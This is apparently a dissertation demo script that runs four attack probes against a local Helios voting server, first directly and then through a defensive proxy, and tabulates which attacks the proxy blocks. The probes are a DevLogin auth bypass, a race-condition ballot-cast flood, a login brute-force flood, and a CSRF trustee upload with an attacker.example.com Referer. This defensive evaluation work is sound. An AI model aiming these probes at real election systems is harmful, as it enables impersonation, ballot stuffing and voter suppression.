"""
Демо: ДО / ПІСЛЯ цифрової імунної системи
Цифрова імунна система — immune_system/demo_before_after.py

Прогоняє однакові атаки двічі:
  1. Напряму в Helios (:8001)        — БЕЗ захисту → атаки проходять
  2. Через ImmuneProxy (:8000)        — З захистом → атаки блокуються (403)

Друкує порівняльну таблицю — головний результат для захисту дисертації.

Передумови:
  - Helios працює на :8001
  - immune_proxy.py працює на :8000
Запуск:  python immune_system/demo_before_after.py
"""

import re
import sys
import threading
import requests
from datetime import datetime, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from env_loader import load_config

_cfg = load_config()
ROOT = Path(_cfg.get("_root", Path(__file__).resolve().parent.parent))
REPORTS_DIR = ROOT / _cfg.get("paths", {}).get("reports_dir", "reports")

HELIOS_DIRECT = "http://localhost:8001"   # без захисту
PROXY         = "http://localhost:8000"   # із захистом ЦІС
UUID          = _cfg.get("helios", {}).get("election_uuid", "c88cfaeb-abc0-4440-a165-a77cab2951f2")


def _csrf(session, base, path):
    r = session.get(f"{base}{path}", timeout=5)
    m = re.search(r'csrfmiddlewaretoken.*?value=[\'"]([^\'"]+)', r.text)
    return m.group(1) if m else ""


# ─── Атаки-проби ──────────────────────────────────────────────────────────────

def probe_devlogin(base):
    """Authentication Bypass через DevLogin (без пароля)."""
    s = requests.Session()
    csrf = _csrf(s, base, "/auth/devlogin/login")
    r = s.post(f"{base}/auth/devlogin/login",
               data={"csrfmiddlewaretoken": csrf},
               headers={"Referer": f"{base}/auth/devlogin/login"},
               timeout=5, allow_redirects=False)
    if r.status_code == 403:
        return ("BLOCKED", r.status_code)
    got_session = bool(s.cookies.get("sessionid"))
    return ("УСПІХ" if r.status_code in (200, 302) and got_session else "невдало", r.status_code)


def probe_race(base):
    """Race condition: 5 одночасних POST /cast."""
    results = []
    barrier = threading.Barrier(5)
    def worker():
        s = requests.Session()
        s.cookies.set("sessionid", "demoRace123")
        barrier.wait()
        try:
            r = s.post(f"{base}/helios/elections/{UUID}/cast",
                       data={"encrypted_vote": "{}"}, timeout=5, allow_redirects=False)
            results.append(r.status_code)
        except requests.exceptions.RequestException:
            results.append(0)
    ts = [threading.Thread(target=worker) for _ in range(5)]
    for t in ts: t.start()
    for t in ts: t.join()
    blocked = sum(1 for c in results if c == 403)
    reached = sum(1 for c in results if c in (200, 302, 500))
    if blocked:
        return (f"BLOCKED {blocked}/5", f"reached={reached}")
    return (f"УСПІХ reached={reached}/5", "0 заблоковано")


def probe_login_flood(base):
    """Brute-force / suppression: 12 швидких логінів."""
    codes = []
    for _ in range(12):
        try:
            r = requests.post(f"{base}/auth/password/login",
                              data={"voter_id": "voter4", "password": "x"},
                              timeout=5, allow_redirects=False)
            codes.append(r.status_code)
        except requests.exceptions.RequestException:
            codes.append(0)
    blocked = sum(1 for c in codes if c == 403)
    if blocked:
        passed = codes.index(403) if 403 in codes else 0
        return (f"BLOCKED після {passed}", f"{blocked} дропнуто")
    return (f"УСПІХ {len(codes)}/12 пройшли", "0 заблоковано")


def probe_trustee_csrf(base):
    """CSRF на trustee upload із зовнішнього Referer."""
    s = requests.Session()
    try:
        r = s.post(f"{base}/helios/elections/{UUID}/trustees/fake-uuid/upload-decryption",
                   data={"factors_and_proofs": "{}"},
                   headers={"Referer": "http://attacker.example.com/evil"},
                   timeout=5, allow_redirects=False)
    except requests.exceptions.RequestException:
        return ("помилка", "—")
    if r.status_code == 403 and "Immune" in r.text:
        return ("BLOCKED", r.status_code)
    return (f"досягло Helios", r.status_code)


PROBES = [
    ("DevLogin auth bypass",   "impersonation",          probe_devlogin),
    ("Race condition /cast",   "ballot_stuffing",        probe_race),
    ("Login flood (suppress)", "voter_suppression",      probe_login_flood),
    ("CSRF trustee takeover",  "csrf_trustee_takeover",  probe_trustee_csrf),
]


# ─── Прогін ───────────────────────────────────────────────────────────────────

def run_against(base, label):
    print(f"\n  ▶ Прогін {label} ({base})")
    out = {}
    for name, cls, fn in PROBES:
        try:
            verdict, detail = fn(base)
        except requests.exceptions.ConnectionError:
            verdict, detail = ("НЕДОСТУПНО", "сервер не відповідає")
        out[name] = (verdict, detail)
        icon = "🔴" if "BLOCKED" in verdict else ("⚠️ " if "УСПІХ" in verdict else "  ")
        print(f"    {icon} {name:<26} {verdict}  ({detail})")
    return out


def main():
    print("=" * 74)
    print("  🧪  ДЕМО: ДО / ПІСЛЯ цифрової імунної системи")
    print("  Однакові атаки → напряму в Helios vs через ImmuneProxy")
    print("=" * 74)

    # перевірка доступності
    for base, who in [(HELIOS_DIRECT, "Helios :8001"), (PROXY, "ImmuneProxy :8000")]:
        try:
            requests.get(base, timeout=3)
        except requests.exceptions.ConnectionError:
            print(f"\n  ❌ {who} недоступний за {base}")
            print("     Запусти: Helios на :8001 та immune_proxy.py на :8000")
            return

    before = run_against(HELIOS_DIRECT, "БЕЗ ЗАХИСТУ")
    after  = run_against(PROXY, "З ЦІС (ImmuneProxy)")

    # ─── Порівняльна таблиця ──────────────────────────────────────────────────
    print("\n" + "=" * 74)
    print("  📊 ПОРІВНЯЛЬНА ТАБЛИЦЯ — головний результат")
    print("=" * 74)
    print(f"  {'Атака':<28} {'БЕЗ ЗАХИСТУ':<22} {'З ЦІС':<20}")
    print(f"  {'─'*70}")
    neutralized = 0
    for name, cls, fn in PROBES:
        b = before[name][0]
        a = after[name][0]
        stopped = "BLOCKED" in a and "BLOCKED" not in b
        if stopped:
            neutralized += 1
        mark = " ✓" if stopped else ""
        print(f"  {name:<28} {b:<22} {a:<20}{mark}")
    print(f"  {'─'*70}")
    print(f"  Нейтралізовано атак: {neutralized}/{len(PROBES)}")
    print("=" * 74)
    print("\n  Метрики ЦІС: curl http://localhost:8000/__immune__/stats")

    # ─── Таблиця для дисертації (.txt) ─────────────────────────────────────────
    tbl = [
        "ТАБЛИЦЯ 3.7 — Демонстрація ДО / ПІСЛЯ ЦІС (однакові атаки)",
        "",
        f"{'Атака':<28} {'БЕЗ захисту (:8001)':<24} {'З ЦІС (:8000)':<22} Нейтр.",
        "─" * 82,
    ]
    for name, cls, fn in PROBES:
        b, a = before[name][0], after[name][0]
        stopped = "BLOCKED" in a and "BLOCKED" not in b
        tbl.append(f"{name:<28} {b:<24} {a:<22} {'так' if stopped else '—'}")
    tbl += [
        "─" * 82,
        f"Нейтралізовано атак: {neutralized}/{len(PROBES)}",
        "",
        "Примітки: ліворуч — сирий Helios без захисту (атака проходить), праворуч —",
        "  через ImmuneProxy (атака блокується 403). Різниця = ефект ЦІС.",
    ]
    ts = datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S")
    defense_dir = REPORTS_DIR / "defense"
    defense_dir.mkdir(parents=True, exist_ok=True)
    (defense_dir / f"demo_before_after_{ts}.txt").write_text("\n".join(tbl), encoding="utf-8")
    print(f"  [+] Таблиця для дисертації: reports/defense/demo_before_after_{ts}.txt")


if __name__ == "__main__":
    main()
